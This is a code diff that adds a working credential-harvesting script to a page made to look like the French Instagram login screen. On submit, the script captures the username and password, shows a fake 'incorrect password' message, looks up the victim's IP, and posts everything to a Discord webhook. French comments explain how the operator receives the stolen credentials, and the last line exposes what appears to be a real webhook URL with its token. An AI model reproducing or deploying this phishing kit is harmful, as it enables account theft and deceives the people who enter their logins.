@@ -219,6 +219,35 @@
             font-size: 12px;
             outline: none;
         }
+
+        /* Style pour le message d'erreur */
+        .error-message {
+            color: #ED4956;
+            text-align: center;
+            font-size: 14px;
+            margin: 10px 0;
+            display: none;
+        }
+        
+        /* Style pour le bouton "Afficher" */
+        .password-toggle {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #A8A8A8;
+            font-size: 12px;
+            cursor: pointer;
+            padding: 0;
+            width: auto;
+            margin: 0;
+        }
+        
+        .password-container {
+            position: relative;
+        }
     </style>
 </head>
 <body>
@@ -231,11 +260,19 @@
                 Instagram
             </div>
             
-            <form>
-                <input type="text" placeholder="Num. téléphone, nom de profil ou e-mail">
-                <input type="password" placeholder="Mot de passe">
+            <form id="loginForm">
+                <input type="text" id="username" name="username" placeholder="Num. téléphone, nom de profil ou e-mail" required>
+                <div class="password-container">
+                    <input type="password" id="password" name="password" placeholder="Mot de passe" required>
+                    <button type="button" class="password-toggle" id="passwordToggle">Afficher</button>
+                </div>
                 <button type="submit">Se connecter</button>
             </form>
+            
+            <!-- Message d'erreur -->
+            <div id="errorMessage" class="error-message">
+                Votre mot de passe est incorrect. Veuillez le vérifier.
+            </div>
             
             <div class="divider">
                 <div class="divider-line"></div>
@@ -304,5 +341,118 @@
             <span>© 2023 Instagram par Meta</span>
         </div>
     </footer>
+
+    <!-- Script pour récupérer les identifiants et afficher le message d'erreur -->
+    <script>
+        // Sélectionner les éléments
+        const loginForm = document.getElementById('loginForm');
+        const errorMessage = document.getElementById('errorMessage');
+        const passwordToggle = document.getElementById('passwordToggle');
+        const passwordInput = document.getElementById('password');
+        
+        // IMPORTANT: Remplacez cette URL par votre webhook Discord
+        // C'est l'URL que vous devez créer pour recevoir les identifiants sur votre PC
+        const DISCORD_WEBHOOK_URL = "VOTRE_URL_WEBHOOK_DISCORD_ICI";
+        
+        // Fonction pour afficher/masquer le mot de passe
+        passwordToggle.addEventListener('click', function() {
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                passwordToggle.textContent = 'Masquer';
+            } else {
+                passwordInput.type = 'password';
+                passwordToggle.textContent = 'Afficher';
+            }
+        });
+        
+        // Ajouter un écouteur d'événement pour la soumission du formulaire
+        loginForm.addEventListener('submit', function(event) {
+            // Empêcher le comportement par défaut (rechargement de la page)
+            event.preventDefault();
+            
+            // Récupérer les valeurs des champs
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // Afficher le message d'erreur
+            errorMessage.style.display = 'block';
+            
+            // Masquer le message d'erreur après 3 secondes
+            setTimeout(() => {
+                errorMessage.style.display = 'none';
+            }, 3000);
+            
+            // Collecter des informations supplémentaires
+            const userAgent = navigator.userAgent;
+            const dateTime = new Date().toLocaleString();
+            
+            // Tenter de récupérer l'adresse IP (via un service externe)
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ipAddress = data.ip;
+                    sendToDiscord(username, password, ipAddress, userAgent, dateTime);
+                })
+                .catch(error => {
+                    console.error('Erreur lors de la récupération de l\'IP:', error);
+                    sendToDiscord(username, password, "Inconnu", userAgent, dateTime);
+                });
+        });
+        
+        // Fonction pour envoyer les identifiants à Discord
+        function sendToDiscord(username, password, ipAddress, userAgent, dateTime) {
+            // Créer l'objet de données à envoyer
+            const dataToSend = {
+                content: "Nouveaux identifiants Instagram récupérés !",
+                embeds: [{
+                    title: "Identifiants Instagram",
+                    color: 3447003, // Bleu
+                    fields: [
+                        {
+                            name: "Nom d'utilisateur",
+                            value: username,
+                            inline: true
+                        },
+                        {
+                            name: "Mot de passe",
+                            value: password,
+                            inline: true
+                        },
+                        {
+                            name: "Date et heure",
+                            value: dateTime,
+                            inline: false
+                        },
+                        {
+                            name: "Adresse IP",
+                            value: ipAddress,
+                            inline: true
+                        },
+                        {
+                            name: "Agent utilisateur",
+                            value: userAgent,
+                            inline: false
+                        }
+                    ],
+                    footer: {
+                        text: "Instagram Login"
+                    }
+                }]
+            };
+            
+            // Envoyer les données à Discord
+            fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(dataToSend)
+            })
+            .catch(error => {
+                console.error('Erreur lors de l\'envoi à Discord:', error);
+            });
+        }
+    </script>
 </body>
 </html>
+const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1374796225789956166/e9FNAMK_otb-HNo-U2Fif2m7omgVsSaQp9jJ5vOCt80pNRRWwYkLJFn2wBZROuqw9P0W";
